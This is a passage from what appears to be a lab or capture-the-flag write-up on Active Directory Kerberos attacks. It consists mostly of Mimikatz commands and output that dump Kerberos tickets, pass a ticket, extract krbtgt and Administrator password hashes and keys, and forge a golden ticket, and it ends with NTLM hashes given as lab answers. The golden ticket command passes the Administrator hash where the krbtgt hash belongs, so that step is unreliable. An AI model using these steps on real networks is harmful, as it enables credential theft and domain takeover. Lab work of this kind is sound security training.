           Session Key       : 0x00000012 - aes256_hmac
             8c54b82db2eee66e5b69ef14f67b89deefef16c93b4380844bba010db7afa9a8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000006]
           Start/End/MaxRenew: 9/21/2021 5:14:18 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             22574e89d5fe86813f1027654cf51456fadf70ea7601ab4bbf65d204f3530538
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-6-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi !
         [00000007]
           Start/End/MaxRenew: 9/21/2021 5:14:18 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             c34526c20d7950d9df60bb7f9679deff266d292444c2e9da1a914e89c1282d30
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-7-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/21/2021 5:14:18 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0eeca421831319001d9c12ea7747b38a8d7874162f650a6f92117b23399f3d68
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
         [00000001]
           Start/End/MaxRenew: 9/21/2021 5:14:18 PM ; 9/22/2021 3:14:18 AM ; 9/28/2021 5:14:18 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             7d145ad55500c44dfec3382ed8bce697cae4b2588c4f1b83c1e6569df90bbc49
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
```
### Passing the Ticket w/ Mimikatz
```
mimikatz # kerberos::ptt [0;2bc723]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi

* File: '[0;2bc723]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK
```
```
PS C:\Users\Administrator\Downloads> klist

Current LogonId is 0:0x2bc723

Cached Tickets: (3)

#0>     Client: Administrator @ CONTROLLER.LOCAL
        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 9/21/2021 17:49:38 (local)
        End Time:   9/22/2021 3:49:38 (local)
        Renew Time: 9/28/2021 17:49:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
## Task 7: Golden/Silver Ticket Attacks w/ mimikatz 
### Dump the krbtgt hash
```

mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6

 * WDigest
    01  d2e9aa3caa4509c3f11521c70539e4ad
    02  c9a868fc195308b03d72daa4a5a4ee47
    03  171e066e448391c934d0681986f09ff4
    04  d2e9aa3caa4509c3f11521c70539e4ad
    05  c9a868fc195308b03d72daa4a5a4ee47
    06  41903264777c4392345816b7ecbf0885
    07  d2e9aa3caa4509c3f11521c70539e4ad
    08  9a01474aa116953e6db452bb5cd7dc49
    09  a8e9a6a41c9a6bf658094206b51a4ead
    10  8720ff9de506f647ad30f6967b8fe61e
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b
    21  bffaf3c4eba18fd4c845965b64fca8e2
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 79bf07137a8a6b8f

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223
```
### Creating a Golden Ticket
```
mimikatz # lsadump::lsa /inject /name:Administrator
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 000001f4 (500)
User : Administrator

 * Primary
    NTLM : 2777b7fec870e04dda00cd7260f7bee6
    LM   :
  Hash NTLM: 2777b7fec870e04dda00cd7260f7bee6

 * Kerberos
    Default Salt : WIN-G83IJFV2N03Administrator
    Credentials
      des_cbc_md5       : 918abaf7dcb02ce6

 * Kerberos-Newer-Keys
    Default Salt : WIN-G83IJFV2N03Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 42b3c13c8c0fef3175eb2b5926f805f919123efd001a9c5a16ee9a86101e32b4
      aes128_hmac       (4096) : d01d6ccf97a2ee214ec7185173a3b659
      des_cbc_md5       (4096) : 918abaf7dcb02ce6

 * NTLM-Strong-NTOWF
    Random Value : 7bfd4ae86442827fb0db294d5c9855ce
mimikatz # kerberos::golden /User:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:2777b7fec870e04dda00cd7260f7bee6 /id:1103
User      : Administrator
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-432953485-3795405108-1502158860
User Id   : 1103
Groups Id : *513 512 520 518 519
ServiceKey: 2777b7fec870e04dda00cd7260f7bee6 - rc4_hmac_nt
Lifetime  : 9/21/2021 8:25:05 PM ; 9/19/2031 8:25:05 PM ; 9/19/2031 8:25:05 PM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```
### What is the SQLService NTLM Hash
```
cd40c9ed96265531b21fc5b1dafcfb0a
```
### What is the Administrator NTLM Hash
```
2777b7fec870e04dda00cd7260f7bee6
```